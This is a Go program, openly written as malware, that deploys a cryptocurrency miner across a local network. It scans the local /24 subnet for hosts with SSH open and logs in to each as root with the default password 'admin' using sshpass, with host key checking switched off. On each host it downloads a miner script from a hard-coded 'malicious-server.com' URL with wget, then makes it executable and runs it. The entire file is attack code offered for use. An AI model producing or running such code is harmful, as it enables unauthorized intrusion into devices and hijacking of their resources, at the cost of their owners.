package main

import (
	"bytes"
	"fmt"
	"log"
	"net"
	"os/exec"
	"strings"
	"time"
)

const (
	payloadURL   = "http://malicious-server.com/miner.sh"
	sshPort      = "22"
	sshUser      = "root"
	sshPassword  = "admin"
	scanTimeout  = 2 * time.Second
)

func main() {
	log.Println("[*] Starting IoT miner deployment scan")
	network := getLocalNetwork()
	hosts := scanNetwork(network)
	deployToHosts(hosts)
}

func getLocalNetwork() string {
	interfaces, _ := net.Interfaces()
	for _, iface := range interfaces {
		addrs, _ := iface.Addrs()
		for _, addr := range addrs {
			if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
				if ipnet.IP.To4() != nil {
					ip := ipnet.IP.String()
					return ip[:strings.LastIndex(ip, ".")+1] + "0/24"
				}
			}
		}
	}
	return "192.168.1.0/24"
}

func scanNetwork(cidr string) []string {
	var activeHosts []string
	ip, ipnet, _ := net.ParseCIDR(cidr)
	for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); inc(ip) {
		host := ip.String()
		if conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, sshPort), scanTimeout); err == nil {
			conn.Close()
			activeHosts = append(activeHosts, host)
			log.Printf("[+] Found open SSH: %s", host)
		}
	}
	return activeHosts
}

func deployToHosts(hosts []string) {
	for _, host := range hosts {
		log.Printf("[*] Attempting deployment to %s", host)
		cmd := exec.Command("sshpass", "-p", sshPassword, "ssh", "-o", "StrictHostKeyChecking=no", sshUser+"@"+host, fmt.Sprintf("wget -O /tmp/miner.sh %s && chmod +x /tmp/miner.sh && /tmp/miner.sh", payloadURL))
		var out bytes.Buffer
		cmd.Stdout = &out
		cmd.Stderr = &out
		if err := cmd.Run(); err != nil {
			log.Printf("[-] Failed on %s: %v", host, err)
		} else {
			log.Printf("[+] Payload deployed to %s", host)
		}
	}
}

func inc(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}